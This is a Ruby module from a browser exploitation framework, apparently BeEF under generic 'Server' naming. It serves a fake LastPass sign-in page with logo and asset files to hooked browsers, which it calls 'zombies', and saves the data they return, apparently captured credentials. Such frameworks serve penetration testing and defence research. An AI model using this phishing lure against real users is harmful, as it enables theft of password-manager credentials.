#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_lastpass < Server::Core::Command
  def pre_send
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/core/main/client/lib/jquery-1.12.4.min.js', '/lp/jquery', 'js')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/index-new.html', '/lp/index', 'html')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/lp_signin_logo.png', '/lp/lp_signin_logo', 'png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/cancel.png', '/lp/cancel', 'png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/keyboard.png', '/lp/keyboard', 'png')
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    if @datastore['meta'] == 'KILLFRAME'
      Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/index.html')
      Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/jquery.js')
      Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/lp_signin_logo.png')
      Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/cancel.png')
      Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/keyboard.png')
    end
    content = {}
    content['result'] = @datastore['result']
    save content
  end
end
